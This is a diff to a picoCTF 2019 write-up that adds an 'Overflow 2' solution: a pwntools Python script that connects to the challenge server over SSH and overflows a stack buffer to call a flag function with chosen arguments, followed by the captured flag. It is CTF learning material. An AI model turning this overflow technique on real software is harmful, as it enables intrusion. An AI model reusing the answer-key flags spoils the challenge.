@@ -7,7 +7,7 @@
 | ------- | -------- | ------ | ------- | -------- | ------ | 
 | [Handy Shellcode](#handyshellcode) | Binary Exploitation | 50 | [Overflow 0](#overflow0) | Binary Exploitation | 100 |
 | [Slippery Shellcode](#slipperyshellcode) | Binary Exploitation | 200 | [Overflow 1](#overflow1) | Binary Exploitation | 150 |
-
+|  New Overflow | Binary Exploitation | 200 | [Overflow 2](#overflow2) | Binary Exploitation | 250 |
 ***
 
 ## HANDY SHELLCODE <a name="handyshellcode"></a>
@@ -164,6 +164,58 @@ print io.recv()
 ~~~
 
 **Flag:** *picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5b80c9cbf}*
+
+[Return to Top](#picoctf19)
+***
+
+## OVERFLOW 2<a name="overflow2"></a>
+
+> ### Problem
+>> Now try overwriting arguments. Can you get the flag from this program? You can find it in 
+>> /problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446 on the shell server.
+>> [(Source)](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/Pico_CTF(2019)/Sources/overflow2source.md#overflow2source1)
+
+> ### Solution
+>>
+>>
+>>
+
+~~~python
+#!/usr/bin/env python
+
+from pwn import *
+
+# elf = context.binary = ELF('vuln')
+context.update(os='linux', arch='i386')
+context.log_level = 'info'
+
+s = ssh(host='2019shell1.picoctf.com', user='User', password='Pa$$w0rd')
+
+io = s.process('vuln',cwd='/problems/overflow-2_3_051820c27c2e8c060021c0b9705ae446')
+
+# io = process(elf.path)
+
+padding = cyclic(cyclic_find('waab'))          # location of pattern match @ eip
+argu1 = p32(0xdeadbeef)                        # first argurment to pass to flag function
+argu2 = p32(0xc0ded00d)                        # second argument to pass to flag function
+rop = p32(0x0804878a)                          # pop edi; pop ebp; ret;
+flag = p32(0x080485e6)                         # address of flag function
+
+payload = padding 
+payload += flag
+payload += rop
+payload += argu1
+payload += argu2
+
+
+# gdb.attach(io, gdbscript = 'b* main')
+
+print io.recv()
+io.sendline(payload)
+print io.recv()
+~~~
+
+**Flag:** *picoCTF{arg5_and_r3turn51b106031}*
 
 [Return to Top](#picoctf19)
 ***
